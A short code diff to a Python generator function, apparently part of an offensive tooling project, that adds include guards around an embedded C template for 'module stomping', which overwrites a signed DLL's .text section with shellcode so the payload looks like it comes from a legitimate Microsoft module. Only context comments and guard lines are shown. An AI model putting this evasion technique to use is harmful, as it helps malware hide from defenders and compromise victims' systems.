@@ -36,6 +36,9 @@ def generate_module_stomping() -> Dict[str, Any]:
 // Overwrites the .text section of a loaded signed DLL with shellcode,
 // making the payload appear to originate from a legitimate Microsoft module.
 
+#ifndef PHANTOM_MODULE_STOMPING_INCLUDED
+#define PHANTOM_MODULE_STOMPING_INCLUDED
+
 #include <windows.h>
 #include <stdio.h>
 
@@ -108,6 +111,8 @@ static BOOL module_stomp(unsigned char *shellcode, size_t shellcode_len) {
     // FreeLibrary not called intentionally – shellcode may still be running.
     return TRUE;
 }
+
+#endif /* PHANTOM_MODULE_STOMPING_INCLUDED */
 """
 
     return {
